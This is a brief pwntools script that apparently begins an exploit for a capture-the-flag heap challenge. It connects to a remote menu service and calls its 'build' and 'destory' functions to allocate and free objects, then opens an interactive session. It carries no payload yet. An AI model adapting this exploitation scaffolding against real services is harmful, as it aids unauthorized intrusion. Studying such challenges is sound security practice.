from pwn import *

s = remote('192.168.33.10',1234)
def build(name, t):
  s.recvuntil('Your choice :')
  s.sendline('1')
  s.recvuntil('gundam :')
  s.send(name)
  s.recvuntil('gundam :')
  s.sendline(str(t))
def destory(index):
  s.recvuntil('Destory:')
  s.sendline(str(index))
build("ABCD",0)
build("1234",0)
destory(0)
s.interactive()
